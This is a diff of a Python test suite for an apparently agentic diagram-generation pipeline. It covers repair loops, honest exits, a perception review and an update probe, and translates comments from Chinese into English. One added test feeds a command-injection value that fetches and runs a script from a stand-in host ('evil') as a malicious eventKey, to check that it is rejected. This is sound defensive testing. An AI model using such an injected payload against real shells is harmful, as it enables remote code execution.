@@ -1,29 +1,42 @@
-"""archify(九节点图表工程 AGENT 图)离线测试。
+"""Offline tests for the archify nine-station diagram-engineering AGENT graph.
 
-ArchifyScriptedProvider(相位特征锚点)与 bash 回执桩自包含于本文件;
-覆盖:
-1. 图结构 + AST 自动发现 + 九站 executor 插件注册 + validate_pattern +
-   max_steps 预算(修复回路吃步数)
-2. 全链路一轮:route → author(read schema → write 候选)→ probe(silent)
-   → validate(showcase 通过)→ deliver → visual-check → percept →
-   report;回复从回执组装、三级证明分离、感知审查按评审回执陈述;
-   history 无 tool 行 / 图终止清空 graph_state / trace 落 metadata
-3. 收敛诚实出口:验证连续失败不改进 → 修复站在第 3 次访问走确定性
-   诚实出口(第 3 次不调 LLM),汇报含未解决诊断
-4. 改进后通过:fail(2) → fail(1) → pass,冻结并交付,repair 2 轮
-5. 探针通知:update_available → 汇报含紧凑通知 + eventKey ack 命令
-6. 交付失败逃生边:非零退出 → 直达 af_report,visual-check 未运行,
-   汇报明示"失败(非零退出,绝不称为成功)"
-7. 感知评审站:多模态附图(passed/failed 如实进汇报)/ 无证据 skipped /
-   截图文件缺失 skipped / 评审模型无图像能力 skipped(zai 注册表声明)/
-   判定输出不可解析自纠后 skipped(绝不编造通过)
-8. 仓库证据:architecture 候选声明 sources/meta.repository 时,
-   validate/deliver/修复站自验命令条件化拼 --repo-root
-   (repository-evidence/root-required 死锁的解锁口)
-9. 单元:_trailing_stale 收敛语义 / 回执错误计数 / showcase 验收判定 /
-   候选缺失的客观错误(不跑 bash)
-10. Phase 3 迁移:app config bag 的 repair_rounds 覆盖代码默认预算;
-    站点 dispatch 路径发布 pattern_code(app 护栏覆盖的定位键)
+ArchifyScriptedProvider (phase-feature anchors) and the bash receipt stubs
+are self-contained in this file. Covers:
+1. Graph structure + AST auto-discovery + nine-station executor plugin
+   registration + validate_pattern + the max_steps budget (the repair loop
+   consumes steps)
+2. One full turn: route -> author (read schema -> write candidate) ->
+   probe (silent) -> validate (showcase pass) -> deliver -> visual-check ->
+   percept -> report; the reply is assembled from receipts, three-tier
+   evidence is separated, the perception review follows the review receipt;
+   no tool rows in history / graph termination clears graph_state /
+   trace lands in metadata
+3. Convergence honest exit: repeated validation failures without
+   improvement -> the repair station takes the deterministic honest exit on
+   its 3rd visit (no LLM call on the 3rd), report includes unresolved
+   diagnostics
+4. Pass after improvement: fail(2) -> fail(1) -> pass, freeze and deliver,
+   2 repair rounds
+5. Probe notice: update_available -> report includes a compact notice +
+   eventKey ack command
+6. Deliver-failure bail-out edge: non-zero exit -> straight to af_report,
+   visual-check never ran, the report states "failed (non-zero exit, never
+   called a success)"
+7. Perception review station: multimodal with images (passed/failed
+   faithfully reported) / skipped without evidence / skipped when
+   screenshot files are missing / skipped when the reviewer model has no
+   vision (declared by the zai registry) / skipped after self-correction
+   of unparseable verdict output (never fabricates a pass)
+8. Repository evidence: when an architecture candidate declares
+   sources/meta.repository, validate/deliver/repair-station self-check
+   commands conditionally append --repo-root (the unlock for the
+   repository-evidence/root-required deadlock)
+9. Unit: _trailing_stale convergence semantics / receipt error counting /
+   showcase acceptance verdict / objective error for a missing candidate
+   (no bash run)
+10. Phase 3 migration: the app config bag's repair_rounds overrides the
+    code-default budget; station dispatch paths publish pattern_code (the
+    lookup key for app guardrail overrides)
 """
 
 import json
@@ -37,13 +50,14 @@ from async_utils import arun
 
 logging.basicConfig(level=logging.WARNING)
 
-# 宿主装载顺序是"工具先发现、pattern 后装载"(validate_tools 注册期校验);
-# 离线测试进程同样先发现内置工具,再导入/发现 pattern
+# Host load order is "discover tools first, load patterns later"
+# (validate_tools checks at registration time); the offline test process
+# likewise discovers builtin tools first, then imports/discovers patterns
 from nexus.registry.tools import discover_builtin_tools
 
 discover_builtin_tools()
 
-# 感知站的能力守卫查注册表(zai 声明 vision_models)——保证注册表里有 zai
+# The percept station's capability guard consults the registry (zai declares vision_models) — keep zai in the registry
 import atoms.providers.zai_provider  # noqa: F401
 import apps.archify_agent.executor as ax
 from apps.archify_agent.prompts import (
@@ -71,7 +85,7 @@ def pattern():
 
 @pytest.fixture()
 def workspace(tmp_path, monkeypatch):
-    """工作区根指到 tmp(skill_dir 同理——bash 本就打桩,仅命令拼装引用)。"""
+    """Workspace root points at tmp (same for skill_dir — bash is stubbed anyway, only command assembly references it)."""
     root = tmp_path / "ws"
     skill = tmp_path / "skill"
     (skill / "schemas").mkdir(parents=True)
@@ -90,8 +104,9 @@ def launch(pattern, sessions, session_id="s1"):
     session.task_info = {}
     session.cxt.node_map = pattern.node_map
     session.cxt.metadata["llm_override"] = {"code": "x", "model": "m"}
-    # 引擎在轮末把 metadata["archify"] 捡进 trace trail 后摘除
-    # （docs/design/session-persistence.md §6）——挂捕获 sink 以便断言取回。
+    # At turn end the engine moves metadata["archify"] into the trace trail
+    # and removes it there (docs/design/session-persistence.md §6) — attach
+    # a capturing sink so assertions can retrieve it.
     rows = []
 
     async def _trace_sink(ev):
@@ -104,7 +119,7 @@ def launch(pattern, sessions, session_id="s1"):
 
 
 def app_trace_of(session):
-    """取该 session 最后一轮被引擎捡回的 archify 终态 trace。"""
+    """Fetch the final archify trace the engine collected for this session's last turn."""
     for row in reversed(getattr(session, "_app_trace_rows", [])):
         if row["kind"] == "app_trace":
             return row["payload"]["data"]["trace"]
@@ -119,7 +134,7 @@ def chat(sessions, session_id, query):
 
 
 # ============================================================================
-# Scripted provider (相位锚点识别;author 两轮:read → write → 收口)
+# Scripted provider (phase-anchor detection; author rounds: read -> write -> wrap-up)
 # ============================================================================
 
 _CANDIDATE_JSON = json.dumps(
@@ -130,12 +145,14 @@ _CANDIDATE_JSON = json.dumps(
 
 
 class ArchifyScriptedProvider:
-    """按相位特征脚本化:route(ROUTE 锚点)/ author(tools + AUTHOR 锚点,
-    第 1 轮 find、第 2 轮 read、第 3 轮 write、第 4 轮收口)/ repair(
-    tools + REPAIR 锚点,按 repair_edits 次数发 edit_file,之后空转——
-    修复站内部微循环 ≤3 轮/访,空转轮即本访收束)/ percept(PERCEPT 锚点,
-    无 tools;user content 是多模态 parts 数组,按 percept_outputs 队列
-    出票,耗尽回落 percept_verdict 的 JSON)。"""
+    """Scripted by phase features: route (ROUTE anchor) / author (tools +
+    AUTHOR anchor; round 1 find, round 2 read, round 3 write, round 4
+    wrap-up) / repair (tools + REPAIR anchor; emits edit_file repair_edits
+    times, then idles — the repair station's inner micro-loop is <=3 rounds
+    per visit, an idle round closes the visit) / percept (PERCEPT anchor,
+    no tools; the user content is a multimodal parts array; tickets are
+    drawn from the percept_outputs queue, falling back to the
+    percept_verdict JSON once exhausted)."""
 
     def __init__(self, candidate=_CANDIDATE_JSON, repair_edits=2,
                  route_fail_first=False, route_fail_always=False,
@@ -147,8 +164,8 @@ class ArchifyScriptedProvider:
         self.route_fail_first = route_fail_first
         self.route_fail_always = route_fail_always
         self.candidate_write = candidate_write
-        self.write_path = write_path  # 模型实际写入的目标路径(可自选错路径)
-        self.route_type = route_type  # 路由相位返回的图表类型
+        self.write_path = write_path  # the path the model actually writes to (may pick a wrong path)
+        self.route_type = route_type  # diagram type returned by the route phase
         self.percept_verdict = percept_verdict or {
             "status": "passed", "defects": [],
             "summary": "明暗两主题×两视口构图收敛,无可见缺陷"}
@@ -163,8 +180,9 @@ class ArchifyScriptedProvider:
 
     @staticmethod
     def _content_text(content) -> str:
-        """消息文本(感知站的 content 是 parts 数组:文本 part 取 text
-        字段,图像 part 只留标记——锚点识别用,不搬 base64)。"""
+        """Message text (the percept station's content is a parts array:
+        text parts contribute their text field, image parts keep only a
+        marker — for anchor detection, no base64 shuffling)."""
         if isinstance(content, list):
             return "".join(
                 p.get("text", "") if isinstance(p, dict)
@@ -182,7 +200,7 @@ class ArchifyScriptedProvider:
             return "repair"
         if PERCEPT_ANCHOR in text:
             return "percept"
-        return "route"  # 兜底(route 是唯一无锚点的相位)
+        return "route"  # fallback (route is the only phase without an anchor)
 
     async def achat_completion(self, messages, model, temperature=0.7,
                                max_tokens=2048, tools=None, tool_choice=None):
@@ -253,8 +271,8 @@ class ArchifyScriptedProvider:
 
 
 # ============================================================================
-# bash 回执桩(validate/deliver/visual-check/check-update 按队列出票;
-# read/write/edit 放行真实文件工具)
+# bash receipt stubs (validate/deliver/visual-check/check-update issue
+# tickets from queues; read/write/edit pass through to the real file tools)
 # ============================================================================
 
 def _pass_receipt():
@@ -279,8 +297,9 @@ def _bash_payload(receipt_json):
         ensure_ascii=False)
 
 
-# visual-check 截图侧车(visual-check.mjs sidecarPaths 的命名契约:
-# <stem>.visual-check.<WxH>.<theme>.png × 4,与交付 HTML 同目录)
+# visual-check screenshot sidecars (naming contract of visual-check.mjs
+# sidecarPaths: <stem>.visual-check.<WxH>.<theme>.png x 4, next to the
+# delivered HTML)
 _SHOT_FILES = [
     f"demo.visual-check.{vp}.{theme}.png"
     for vp in ("1440x900", "2048x1320")
@@ -297,9 +316,10 @@ def _visual_pass_receipt():
 
 
 def _materialize_sidecars(receipt):
-    """默认回执配套落盘假 PNG(感知站只做 base64,不解析像素)。
-    显式传入 visual_receipt 的测试不落盘——正好覆盖"回执列出但文件
-    缺失"的诚实 skipped 路径。"""
+    """Write fake PNGs alongside the default receipt (the percept station
+    only base64-encodes, never parses pixels). Tests passing visual_receipt
+    explicitly skip the writes — exactly covering the honest skipped path
+    of "receipt lists files that are missing on disk"."""
     root = ax._absolutize(ax._DEFAULT_WORKSPACE_ROOT) / "s1"
     root.mkdir(parents=True, exist_ok=True)
     for s in (receipt.get("captures") or {}).get("screenshots") or []:
@@ -309,8 +329,10 @@ def _materialize_sidecars(receipt):
 
 def make_cli_stub(validate_receipts, deliver_receipt=None,
                   visual_receipt=None, probe_receipt=None, calls=None):
-    """返回 _execute_tool 桩:bash 按命令关键词出票(队列耗尽复用末张),
-    其他工具走真实注册表(文件读写落 tmp 工作区)。__CAND__ 占位符替换。"""
+    """Return an _execute_tool stub: bash issues tickets by command keyword
+    (once a queue is exhausted the last ticket is reused); other tools go
+    through the real registry (file I/O lands in the tmp workspace).
+    Replaces the __CAND__ placeholder."""
     import nexus.engine.loop as loop_mod
 
     real = loop_mod._execute_tool
@@ -351,8 +373,10 @@ def make_cli_stub(validate_receipts, deliver_receipt=None,
 
 
 def _candidate_path():
-    """确定式候选路径:<workspace_root>/<session_id>/<output_name>.json
-    (scripted 路由回复 output_name=demo,会话 s1;与执行器同逻辑取绝对)。"""
+    """Deterministic candidate path:
+    <workspace_root>/<session_id>/<output_name>.json (the scripted route
+    reply uses output_name=demo, session s1; absolutized with the same
+    logic as the executor)."""
     root = ax._absolutize(ax._DEFAULT_WORKSPACE_ROOT)
     return str(root / "s1" / "demo.json")
 
@@ -377,7 +401,7 @@ def test_pattern_structure_and_executor_binding(pattern):
     assert pattern.code == "archify"
     assert pattern.pattern_type == "agent"
     assert pattern.entry_node_code == "af_route"
-    assert pattern.max_steps == 20  # 修复回路预算(stale-5 诚实退出全程 16 步)
+    assert pattern.max_steps == 20  # repair-loop budget (stale-5 honest exit takes 16 steps overall)
 
     codes = [n.code for n in pattern.nodes]
     assert codes == ["af_route", "af_author", "af_update_probe",
@@ -389,10 +413,10 @@ def test_pattern_structure_and_executor_binding(pattern):
         "af_deliver", "af_repair"]
     assert pattern.node_map["af_repair"].sub_nodes == [
         "af_validate", "af_report"]
-    # 交付失败逃生边:非零退出直达汇报站(不跑浏览器检查)
+    # Deliver-failure bail-out edge: non-zero exit goes straight to the report station (no browser check)
     assert pattern.node_map["af_deliver"].sub_nodes == [
         "af_visual_check", "af_report"]
-    # 感知评审:浏览器证据之后、汇报之前(零工具纯语义站)
+    # Perception review: after browser evidence, before the report (zero-tool, purely semantic station)
     assert pattern.node_map["af_visual_check"].sub_nodes == ["af_percept"]
     assert pattern.node_map["af_percept"].sub_nodes == ["af_report"]
     assert pattern.node_map["af_report"].sub_nodes == []
@@ -407,9 +431,10 @@ def test_pattern_structure_and_executor_binding(pattern):
                                                        "find_files"]
     assert pattern.node_map["af_repair"].use_tools == [
         "read_text", "edit_file", "write_text", "bash"]
-    # 创作轮次预算(代码默认;app config bag 的 author_rounds 可覆盖):
-    # find 示例 + 读×3 + 写 + 收口 + 一次容错(实跑证明 6 轮零余量,
-    # 一次磕绊即耗尽 → 候选缺失)
+    # Authoring-rounds budget (code default; the app config bag's
+    # author_rounds can override): find examples + 3 reads + write +
+    # wrap-up + one tolerance round (real runs proved 6 rounds have zero
+    # slack — one stumble exhausts it -> missing candidate)
     assert ax._DEFAULT_AUTHOR_ROUNDS == 10
 
     from nexus.model.validation import validate_pattern
@@ -436,9 +461,10 @@ def test_full_turn_happy_path(pattern, workspace):
     cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # 相位顺序:route → author(4 轮:find 示例→读 schema→写候选→收口)
-    # → probe → validate → deliver → visual-check → percept(1 轮多模态);
-    # report 不调 LLM(从回执组装)
+    # Phase order: route -> author (4 rounds: find examples -> read schema
+    # -> write candidate -> wrap-up) -> probe -> validate -> deliver ->
+    # visual-check -> percept (1 multimodal round); report calls no LLM
+    # (assembled from receipts)
     assert provider.route_calls == 1
     assert provider.author_calls == 4
     assert provider.repair_calls == 0
@@ -451,20 +477,20 @@ def test_full_turn_happy_path(pattern, workspace):
     assert bash_kinds == ["check-update", "validate", "deliver",
                           "visual-check"]
 
-    # 候选真实落盘(tmp 工作区)
+    # Candidate really written to disk (tmp workspace)
     cand = _candidate_path()
     assert json.loads(Path(cand).read_text(encoding="utf-8"))["meta"][
         "quality_profile"] == "showcase"
 
-    # 汇报从回执组装:三级证明分离 + 感知审查按评审回执陈述
+    # Report assembled from receipts: three-tier evidence separated + perception review per the review receipt
     assert "showcase 验收通过" in reply
     assert "交付: 成功" in reply
     assert "浏览器证据: pass" in reply
     assert "感知审查: passed(图像能力评审 x/m,4 张截图" in reply
     assert "感知审查: 未执行" not in reply
-    assert "更新探针" not in reply  # silent 不提及
+    assert "更新探针" not in reply  # silent goes unmentioned
 
-    # 感知请求是 OpenAI 风格多模态 parts:1 个文本(锚点+清单)+ 4 个图像
+    # The percept request is OpenAI-style multimodal parts: 1 text (anchor + checklist) + 4 images
     percept_reqs = [msgs for kind, msgs in provider.requests
                     if kind == "percept"]
     assert len(percept_reqs) == 1
@@ -477,7 +503,7 @@ def test_full_turn_happy_path(pattern, workspace):
     assert all(p["image_url"]["url"].startswith("data:image/png;base64,")
                for p in image_parts)
 
-    # 终态:trace 落 metadata;图终止清空 graph_state;位置在汇报站
+    # Final state: trace lands in metadata; graph termination clears graph_state; position is the report station
     trace = app_trace_of(session)
     assert trace["diagram_type"] == "workflow"
     assert trace["frozen"] is True
@@ -490,7 +516,7 @@ def test_full_turn_happy_path(pattern, workspace):
                                "percept"]
     assert session.cxt.graph_state == {}
     assert session.cxt.current_node_code == "af_report"
-    # 研究过程不入会话历史(私有工作区)
+    # The research process stays out of session history (private workspace)
     assert "tool" not in [m.role for m in session.cxt.history]
 
 
@@ -506,10 +532,11 @@ def test_repair_honest_exit_after_stale_rounds(pattern, workspace):
         calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # v1(2) 基线 → r1..r5 → v2..v6(2) → r6 = 收敛闸门拦截(不调 LLM)
+    # v1(2) baseline -> r1..r5 -> v2..v6(2) -> r6 = convergence-gate
+    # interception (no LLM call)
     assert len([c for c in calls if "validate" in c]) == 6
-    # 五次修复访问,每次内部微循环封顶 3 轮:
-    # 3(edit×3)+ 3(edit×2+空转)+ 1+1+1(空转收束)
+    # Five repair visits, each inner micro-loop capped at 3 rounds:
+    # 3 (edit x3) + 3 (edit x2 + idle) + 1+1+1 (idle wrap-up)
     assert provider.repair_calls == 9
     trace = app_trace_of(session)
     assert trace["repair_rounds"] == 5
@@ -521,8 +548,8 @@ def test_repair_honest_exit_after_stale_rounds(pattern, workspace):
     assert trace["honest_exit"] is True
     assert trace["frozen"] is False
     assert "连续 5 轮未刷新错误数下限" in reply
-    assert "诊断0" in reply and "诊断1" in reply  # 未解决诊断如实呈报
-    assert "交付" not in reply  # 未走到交付站,不得出现任何交付声明
+    assert "诊断0" in reply and "诊断1" in reply  # unresolved diagnostics reported faithfully
+    assert "交付" not in reply  # never reached the deliver station, so no delivery claim may appear
     assert "浏览器证据: 未收集" in reply
 
 
@@ -540,7 +567,7 @@ def test_repair_improves_then_passes(pattern, workspace):
     session, reply = run_turn(pattern, provider, cli)
 
     assert len([c for c in calls if "validate" in c]) == 3
-    # visit1: edit×2 + 空转收束(3 轮);visit2: 首轮空转(1 轮)
+    # visit1: edit x2 + idle wrap-up (3 rounds); visit2: first round idle (1 round)
     assert provider.repair_calls == 4
     trace = app_trace_of(session)
     assert trace["repair_rounds"] == 2
@@ -552,8 +579,10 @@ def test_repair_improves_then_passes(pattern, workspace):
 
 
 # ============================================================================
-# 4a. Deterministic label-clearance solver (studio 回归:label-route-clearance
-#     无建议坐标,LLM 六轮做不出像素避让 → 几何归工具,真验证器裁决)
+# 4a. Deterministic label-clearance solver (studio regression:
+#     label-route-clearance with no suggested coordinates; the LLM cannot
+#     manage pixel avoidance in six rounds -> geometry belongs to tools,
+#     adjudicated by the real validator)
 # ============================================================================
 
 _LABEL_CANDIDATE_JSON = json.dumps(
@@ -577,8 +606,9 @@ _LABEL_CANDIDATE_JSON = json.dumps(
 
 
 def _label_clearance_receipt():
-    """studio 实跑的原样诊断:48px 标签 rect 挤在 x=665 竖直段旁,
-    正确挪移是 labelDy +12(|delta| 排序的第一候选)。"""
+    """Verbatim diagnostics from a real studio run: a 48px label rect
+    squeezed next to the vertical segment at x=665; the correct move is
+    labelDy +12 (first candidate by |delta| ordering)."""
     return {
         "ok": False,
         "checks": [{"name": "single_svg", "ok": True}],
@@ -606,8 +636,10 @@ def _label_clearance_receipt():
 
 
 def test_solver_fixes_label_clearance_without_llm(pattern, workspace):
-    """求解器一发命中:闸门 fail(1) → 挪移 labelDy +12 经真验证器裁决
-    更优(0)→ 直接回验证闸门冻结交付——修复站全程零 LLM 调用。"""
+    """Solver hits on the first try: gate fail(1) -> the labelDy +12 move is
+    adjudicated better (0) by the real validator -> straight back to the
+    validation gate to freeze and deliver — zero LLM calls throughout the
+    repair station."""
     provider = ArchifyScriptedProvider(candidate=_LABEL_CANDIDATE_JSON)
     calls = []
     cli = make_cli_stub(
@@ -616,26 +648,28 @@ def test_solver_fixes_label_clearance_without_llm(pattern, workspace):
         calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # 3 次 validate:闸门v1(fail) + 求解器试验1(pass,接受) + 闸门v2(pass)
+    # 3 validate calls: gate v1 (fail) + solver trial 1 (pass, accepted) + gate v2 (pass)
     assert len([c for c in calls if "validate" in c]) == 3
-    assert provider.repair_calls == 0   # 求解器清零,LLM 微循环未开启
+    assert provider.repair_calls == 0   # solver cleared it, the LLM micro-loop never started
     trace = app_trace_of(session)
     assert trace["val_history"] == [1, 0]
     assert trace["frozen"] is True
     assert trace["repair_rounds"] == 1
-    # 挪移真实落盘:connections[2] 得到 labelDy 12(就近第一候选)
+    # The move really lands on disk: connections[2] gets labelDy 12 (nearest first candidate)
     data = json.loads(Path(trace["candidate_path"]).read_text(
         encoding="utf-8"))
     assert data["connections"][2]["labelDy"] == 12.0
-    # 求解器动作进修复履历(下一访的 LLM 能看到几何已被工具处理过)
+    # The solver action enters the repair log (the next visit's LLM can see the geometry was already handled by tools)
     assert "labelDy +12" in trace["repair_log"][0]["summary"]
     assert "showcase 验收通过" in reply
     assert "交付: 成功" in reply
 
 
-# 声明仓库证据的同一张标签图(studio 会话 f2cae679 死锁形态:闸门带
-# --repo-root 只剩 1 个 clearance 错,求解器验证却不带旗标 → 永远看到
-# root-required,判"无改进"全回滚,几何可解的问题交给 LLM 越修越糟)
+# The same label diagram with repository evidence declared (studio session
+# f2cae679 deadlock shape: the gate with --repo-root leaves 1 clearance
+# error, but the solver's validation carries no flag -> it always sees
+# root-required, judges "no improvement" and rolls everything back, handing
+# a geometrically solvable problem to the LLM to make worse)
 _label_evidence_data = json.loads(_LABEL_CANDIDATE_JSON)
 _label_evidence_data["meta"]["repository"] = {
     "url": "https://github.com/o/nexus-kit.git", "revision": "0" * 40}
@@ -645,10 +679,13 @@ _EVIDENCE_LABEL_CANDIDATE_JSON = json.dumps(_label_evidence_data,
 
 def test_solver_validate_carries_repo_root_for_evidence(pattern, workspace,
                                                          monkeypatch):
-    """求解器的真验证守卫必须与闸门同源(同 --repo-root):声明证据的
-    候选上,不带旗标的试验验证只会看到 root-required(1 错),对 1 错
-    基线判"无改进"→ 全部回滚并记 solver_tried(跨访不再试),label
-    避让死锁。带旗标后同一挪移一发命中,零 LLM 冻结交付。"""
+    """The solver's real-validation guard must share provenance with the
+    gate (same --repo-root): on a candidate declaring evidence, a flagless
+    trial validation only ever sees root-required (1 error) and judges "no
+    improvement" against the 1-error baseline -> everything rolls back and
+    solver_tried is recorded (never retried across visits) — a
+    label-avoidance deadlock. With the flag, the same move hits on the
+    first try and delivery is frozen with zero LLM calls."""
     monkeypatch.setattr(ax, "_DEFAULT_REPO_ROOT", "/repo/ev")
     provider = ArchifyScriptedProvider(
         candidate=_EVIDENCE_LABEL_CANDIDATE_JSON, route_type="architecture")
@@ -659,13 +696,15 @@ def test_solver_validate_carries_repo_root_for_evidence(pattern, workspace,
         calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # 闸门 + 求解器试验 + 复核闸门:三次 validate 全部同源带旗标。
-    # 匹配用命令前缀而非 "validate" 子串:pytest 临时目录名取自测试函数
-    # 名(含 "validate"),路径嵌进 deliver/visual-check 命令后子串误命中
+    # Gate + solver trial + re-check gate: all three validate calls carry
+    # the flag with the same provenance. Matching uses the command prefix
+    # rather than a "validate" substring: pytest temp dir names come from
+    # the test function name (which contains "validate"), and paths embedded
+    # in deliver/visual-check commands would false-positive the substring
     vc = [c for c in calls if "archify.mjs validate " in c]
     assert len(vc) == 3
-    assert all('--repo-root "/repo/ev"' in c for c in vc)
-    assert provider.repair_calls == 0   # 求解器清零,没有 LLM 越修越糟
+    assert all('--repo-root /repo/ev' in c for c in vc)
+    assert provider.repair_calls == 0   # solver cleared it, no LLM making things worse
     trace = app_trace_of(session)
     assert trace["val_history"] == [1, 0]
     assert trace["frozen"] is True
@@ -675,9 +714,12 @@ def test_solver_validate_carries_repo_root_for_evidence(pattern, workspace,
 
 
 def test_repair_rolls_back_regressed_candidate(pattern, workspace):
-    """回归守卫(studio 会话 6e20f21d:val_history [1,1,1,13],LLM 微循环
-    把候选从 1 错修到 13 错且带伤收场):验证回归后,修复站下一访先回滚
-    到最优检查点字节再修;后续收敛照常(冻结交付的是回滚后的健康候选)。"""
+    """Regression guard (studio session 6e20f21d: val_history [1,1,1,13],
+    the LLM micro-loop took the candidate from 1 error to 13 and limped
+    off): after a validation regression, the repair station's next visit
+    first rolls back to the best-checkpoint bytes before repairing; later
+    convergence proceeds normally (what gets frozen and delivered is the
+    healthy post-rollback candidate)."""
     provider = ArchifyScriptedProvider(candidate=_LABEL_CANDIDATE_JSON,
                                        repair_edits=1)
     calls = []
@@ -689,11 +731,13 @@ def test_repair_rolls_back_regressed_candidate(pattern, workspace):
 
     trace = app_trace_of(session)
     assert trace["val_history"] == [1, 13, 1, 0]
-    # 回滚注记进修复履历(下一访 LLM 能看到"从最优状态重修")
+    # The rollback note enters the repair log (the next visit's LLM can see
+    # "repairs resumed from the best state")
     assert any("回滚到最优检查点" in e["summary"]
                for e in trace["repair_log"])
-    # 盘上候选是回滚后的健康体:visit1 的 edit(a→b)被撤销(diagram_type
-    # 不再是 "dbagram_type"),v4 冻结的也是这份健康候选
+    # The on-disk candidate is the healthy post-rollback body: visit1's
+    # edit (a->b) was undone (diagram_type is no longer "dbagram_type"),
+    # and v4 freezes this same healthy candidate
     data = json.loads(Path(trace["candidate_path"]).read_text(
         encoding="utf-8"))
     assert data["diagram_type"] == "architecture"
@@ -702,9 +746,10 @@ def test_repair_rolls_back_regressed_candidate(pattern, workspace):
 
 
 def test_solver_reverts_and_defers_to_llm_loop(pattern, workspace):
-    """求解器全败:每个挪移都被真验证器否决 → 字节回滚(候选原样)、
-    失败挪移记履历(后续访问零重试)→ LLM 微循环照常接管,直到 stale-5
-    诚实出口。"""
+    """Solver fails across the board: every move is vetoed by the real
+    validator -> byte rollback (candidate untouched), failed moves are
+    logged (zero retries on later visits) -> the LLM micro-loop takes over
+    as usual until the stale-5 honest exit."""
     provider = ArchifyScriptedProvider(candidate=_LABEL_CANDIDATE_JSON,
                                        repair_edits=2)
     calls = []
@@ -713,22 +758,23 @@ def test_solver_reverts_and_defers_to_llm_loop(pattern, workspace):
         calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # 9 次 validate = 6 次闸门 + 3 次求解器试验(仅第一访;此后挪移键
-    # 已在 solver_tried 里,后续访问不再消耗)
+    # 9 validate calls = 6 gates + 3 solver trials (first visit only;
+    # afterwards the move keys are in solver_tried, so later visits consume
+    # none)
     assert len([c for c in calls if "validate" in c]) == 9
-    # visit1: 求解器 3 试验全败 + LLM 3 轮(edit×2+空转);
-    # visit2..5: 各 1 轮空转(repair_edits 已耗尽)
+    # visit1: all 3 solver trials fail + 3 LLM rounds (edit x2 + idle);
+    # visit2..5: 1 idle round each (repair_edits exhausted)
     assert provider.repair_calls == 7
     trace = app_trace_of(session)
     assert trace["val_history"] == [1] * 6
     assert trace["honest_exit"] is True
     assert trace["repair_rounds"] == 5
-    # 字节回滚:候选没有留下任何被否决的挪移痕迹
+    # Byte rollback: the candidate carries no trace of the vetoed moves
     data = json.loads(Path(trace["candidate_path"]).read_text(
         encoding="utf-8"))
     assert "labelDy" not in data["connections"][2]
     assert "labelAt" not in data["connections"][2]
-    # 履历首条 = 求解器失败注记 + LLM 收口摘要(同访合并)
+    # First log entry = solver-failure note + LLM wrap-up summary (merged within the visit)
     first = trace["repair_log"][0]["summary"]
     assert "均未更优" in first and "信息已足够" in first
     assert "连续 5 轮未刷新错误数下限" in reply
@@ -753,10 +799,32 @@ def test_update_probe_notice_and_ack(pattern, workspace):
 
     assert "[安全更新]" in reply
     assert "2.17" in reply and "2.18" in reply
-    assert "由你决定" in reply            # 信息非许可
+    assert "由你决定" in reply            # information, not permission
     ack = [c for c in calls if "--ack" in c]
-    assert ack == ['node scripts/check-update.mjs --ack "evt-2026-09-15"']
-    # 探针不改变主线:交付/浏览器证据照常
+    assert ack == ["node scripts/check-update.mjs --ack evt-2026-09-15"]
+    # The probe does not change the main line: delivery/browser evidence as usual
+    assert "交付: 成功" in reply
+
+
+def test_update_probe_rejects_malicious_event_key(pattern, workspace):
+    """The eventKey comes from a remote manifest receipt (untrusted): keys
+    outside the whitelist character set must never reach the shell — skip
+    the ack outright (honest degradation), closing the command-injection
+    surface."""
+    provider = ArchifyScriptedProvider()
+    calls = []
+    cli = make_cli_stub(
+        validate_receipts=[_pass_receipt()],
+        probe_receipt={"status": "update_available",
+                       "installed": "2.17", "latest": "2.18",
+                       "eventKey": 'x"$(curl evil/x|sh)"'},
+        calls=calls)
+    session, reply = run_turn(pattern, provider, cli)
+
+    # The notice still renders (the information surface is unaffected); the ack is dropped
+    assert "2.18" in reply
+    assert [c for c in calls if "--ack" in c] == []
+    # Main line as usual
     assert "交付: 成功" in reply
 
 
@@ -776,13 +844,13 @@ def test_deliver_failure_bails_to_report(pattern, workspace):
         calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # 交付失败 → 直达汇报站;浏览器检查绝不对失败交付路径运行
+    # Delivery failure -> straight to the report station; the browser check never runs on the failed delivery path
     assert "visual-check" not in "".join(calls)
     assert "交付: 失败(非零退出,绝不称为成功" in reply
     assert "快照校验失败" in reply
     assert "浏览器证据: 未收集(交付失败路径,按契约跳过)" in reply
     assert "感知审查: 未执行(交付失败逃生路径,按契约跳过)" in reply
-    assert provider.percept_calls == 0   # 评审站不可达
+    assert provider.percept_calls == 0   # review station unreachable
     trace = app_trace_of(session)
     assert trace["deliver_failed"] is True
     assert trace["percept_receipt"] == {}
@@ -790,12 +858,14 @@ def test_deliver_failure_bails_to_report(pattern, workspace):
 
 
 # ============================================================================
-# 6a. Percept station (感知评审:多模态附图 / 诚实 skipped 的全部形态)
+# 6a. Percept station (perception review: multimodal with images / every honest-skipped shape)
 # ============================================================================
 
 def test_percept_failed_verdict_reported_honestly(pattern, workspace):
-    """评审判 failed:缺陷逐条进汇报、correction_rounds 0(首版只如实
-    上报不回环)——评审失败不拖垮已成功的交付,也不触发修复回路。"""
+    """Verdict failed: defects flow into the report one by one,
+    correction_rounds 0 (the first version only reports faithfully, no
+    loop-back) — a failed review does not drag down the already-successful
+    delivery and does not trigger the repair loop."""
     provider = ArchifyScriptedProvider(percept_verdict={
         "status": "failed",
         "defects": [{"viewport": "2048x1320", "theme": "dark",
@@ -806,7 +876,7 @@ def test_percept_failed_verdict_reported_honestly(pattern, workspace):
     session, reply = run_turn(pattern, provider, cli)
 
     assert provider.percept_calls == 1
-    assert provider.repair_calls == 0   # failed 不回环修复
+    assert provider.repair_calls == 0   # failed does not loop back into repair
     assert "感知审查: failed(图像能力评审 x/m,4 张截图;correction_rounds 0)" \
         in reply
     assert "[2048x1320/dark] 下部出现整幅明显空带" in reply
@@ -816,8 +886,9 @@ def test_percept_failed_verdict_reported_honestly(pattern, workspace):
 
 
 def test_percept_skipped_without_evidence(pattern, workspace):
-    """visual-check 环境缺失(无 Chrome,exit 2 skipped):无截图 → 感知
-    审查诚实 skipped,评审模型零调用。"""
+    """visual-check environment missing (no Chrome, exit 2 skipped): no
+    screenshots -> the perception review honestly skips, zero
+    reviewer-model calls."""
     provider = ArchifyScriptedProvider()
